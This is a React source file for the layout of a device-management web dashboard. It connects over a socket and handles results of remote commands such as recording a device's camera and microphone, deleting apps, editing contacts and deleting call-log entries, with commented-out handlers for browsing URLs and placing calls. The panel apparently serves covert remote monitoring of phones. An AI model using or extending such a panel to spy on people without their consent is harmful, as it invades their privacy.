// @ts-nocheck
import React, {useEffect} from 'react'
import Box from '@mui/material/Box'
import {Outlet, useLocation} from 'react-router-dom'
import {observer} from 'mobx-react-lite'
import {SnackbarProvider} from 'notistack'
import Sidebar from './Sidebar/Sidebar'
import CustomizedSnackbars from '../../shared/CustomizedSnackbars/CustomizedSnackbars'
import snackbarStore, {Severity} from '../../stores/snackbarStore'
import {useMutation, useQueryClient} from '@tanstack/react-query'
import UserService from '../../services/UserService'
import userStore from '../../stores/userStore'
import DeviceService from '../../services/DeviceService'
import deviceStore from '../../stores/deviceStore'
import {LocalizationProvider} from '@mui/x-date-pickers'
import {AdapterDayjs} from '@mui/x-date-pickers/AdapterDayjs'
import 'dayjs/locale/ru.js'
import {LocalStorageKeys, WS_PATH} from '../../config'
import {io} from 'socket.io-client'
import SocketStore from '../../stores/socketStore'
import microStore from '../../stores/microStore'
import FilesStore from '../FilesControl/store/filesStore'
import {CommandTypes} from "../../services/CommandService";
import contactsStore from "../../stores/contactsStore";
import callsStore from "../../stores/callsStore";

const Layout = () => {
    const queryClient = useQueryClient()
    const location = useLocation()

    useEffect(() => {
        const socket = io(`${WS_PATH}`, {
            reconnection: true,
            reconnectionAttempts: 3,
            reconnectionDelayMax: 5000,
            randomizationFactor: 0.5,
            path: '/socket.io/front',
            transports: ['websocket'],
            auth: {
                token: `Bearer: ${localStorage.getItem(LocalStorageKeys.ACCESS_TOKEN)}`,
            },
        })

        SocketStore.setWebSocket(socket)

        socket.on('connect', () => {
            console.log('connected to socket')
        })
        socket.on('message', (e) => {
            console.log('socket message')
            console.log(e)
        })

        socket.on('command', (e) => {
            console.log('socket command')
            const command = JSON.parse(e)
            if (command.command_type === CommandTypes.RECORD_CAMERA && command.status === 3) {
                queryClient.invalidateQueries({queryKey: ['cameraFiles']})
            }

            if (command.command_type === CommandTypes.DEL_APPLICATION && command.status === 3) {
                queryClient.invalidateQueries({queryKey: ['appsData']})
            }

            if (command.command_type === CommandTypes.RECORD_MICROPHONE && command.status === 3) {
                if (location.pathname.includes('/env_record')) {
                    microStore.addRecord(command.body)
                }
            }

            if (command.command_type === CommandTypes.ADD_CONTACT && command.status === 3) {
                if (location.pathname.includes('/contacts')) {
                    contactsStore.addContact(command.body)
                }
            }

            if (command.command_type === CommandTypes.DELETE_CONTACT && command.status === 3) {
                if (location.pathname.includes('/contacts')) {
                    console.log(command, 'command')
                    contactsStore.deleteContact(command.body.contact_id)
                }
            }

            if (command.command_type === CommandTypes.DEL_CALL && command.status === 3) {
                if (
                    location.pathname.includes('/call_journal') &&
                    deviceStore.currentDeviceIndex === command.device_id
                ) {
                    callsStore.deleteCall(command.body.call_id)
                }
            }

            // if (command.command_type === CommandTypes.VIEW_NOTIFICATIONS && command.status === 3) {
            //     if (location.pathname.includes('/control_panel') && deviceStore.currentDeviceIndex === command.device_id) {
            //         queryClient.invalidateQueries({queryKey: ['getCommands']})
            //     }
            // }
            //
            // if (command.command_type === CommandTypes.BROWSE_URL && command.status === 3) {
            //     if (location.pathname.includes('/control_panel') && deviceStore.currentDeviceIndex === command.device_id) {
            //         queryClient.invalidateQueries({queryKey: ['getCommands']})
            //     }
            // }
            //
            // if (command.command_type === CommandTypes.MAKE_A_CALL && command.status === 3) {
            //     if (location.pathname.includes('/control_panel') && deviceStore.currentDeviceIndex === command.device_id) {
            //         queryClient.invalidateQueries({queryKey: ['getCommands']})
            //     }
            // }
        })

        socket.on('connect_error', (e) => {
            console.log(e)
        })

        socket.on('device_connected', (e) => {
            console.log('socket device_connected')
            FilesStore.setConnectedDeviceId(JSON.parse(e).device_id)
        })

        socket.on('active_devices', (e) => {
            FilesStore.setActiveDevices(e)
        })

        socket.on('device_disconnected', (e) => {
            console.log('socket device_disconnected')
            FilesStore.setConnectedDeviceId('')
            FilesStore.setActiveDevices(FilesStore.activeDevices.filter((item) => item !== JSON.parse(e).device_id))
            FilesStore.setIsConnectionRequestSent(false)
        })

        socket.on('disconnect', (reason, description) => {
            console.log(reason, description)
            console.log('Соединение разорвано. Переподключение...')
            FilesStore.setConnectedDeviceId('')
            FilesStore.setActiveDevices([])
            FilesStore.setIsConnectionRequestSent(false)
        })

        socket.on('reconnect', (attemptNumber) => {
            console.log('Успешное переподключение на попытке ' + attemptNumber)
        })

        return () => {
            socket.disconnect()
        }
    }, [])

    const {
        mutateAsync: getUser,
        // error: getUserError,
        // isLoading: getUserLoading,
    } = useMutation({
        mutationFn: UserService.getCurrentUser,
        retry: (err: unknown) => {
            if (err.response?.status === 400) {
                return false
            }
        },
        onSuccess: (data) => {
            userStore.setUser(data.data)
        },
        onError: (data) => {
            // setSnackBarSettings({
            //     label: data.detail,
            //     severity: 'error',
            //     opened: true
            // });
        },
    })

    const {
        mutateAsync: getDevices,
        // error: getDevicesError,
        // isLoading: getDevicesLoading,
    } = useMutation({
        mutationFn: DeviceService.getDevices,
        retry: (err: unknown) => {
            if (err.response?.status === 400) {
                return false
            }
        },
        onMutate: () => {
            deviceStore.setIsLoading(true)
        },
        onSuccess: (data: unknown) => {
            deviceStore.setDevices(data.data)
        },
        onError: (data: unknown) => {
            snackbarStore.setSnackbarSettings({
                label: data.data.detail,
                severity: Severity.error,
                opened: true,
            })
        },
        onSettled: () => {
            deviceStore.setIsLoading(false)
        },
    })

    useEffect(() => {
        if (!localStorage.getItem(LocalStorageKeys.REFRESH_TOKEN)) {
            userStore.setIsAuth(false)
        }
        getDevices()

        if (!userStore.user) getUser()
    }, [])

    return (
        <>
            <SnackbarProvider
                maxSnack={3}
                preventDuplicate
                anchorOrigin={{
                    vertical: 'top',
                    horizontal: 'right',
                }}
                disableWindowBlurListener
                autoHideDuration={3000}
            >
                <LocalizationProvider dateAdapter={AdapterDayjs} adapterLocale='ru'>
                    <Box sx={{display: 'flex', height: 'calc(100vh - 48px)'}}>
                        <Sidebar />
                        <Outlet />
                    </Box>
                </LocalizationProvider>
            </SnackbarProvider>

            <CustomizedSnackbars snackBarSettings={snackbarStore.settings} />
        </>
    )
}

export default observer(Layout)
